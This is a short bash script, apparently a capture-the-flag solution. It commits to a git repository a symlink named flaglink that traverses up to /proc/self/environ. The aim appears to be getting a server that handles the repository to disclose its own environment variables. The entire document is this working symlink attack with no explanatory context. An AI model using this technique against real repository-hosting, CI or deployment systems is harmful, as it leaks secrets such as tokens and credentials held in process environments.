#!/bin/bash
rm flaglink
ln -s ../../../proc/self/environ flaglink
git add .
git commit -m 'add flaglink'
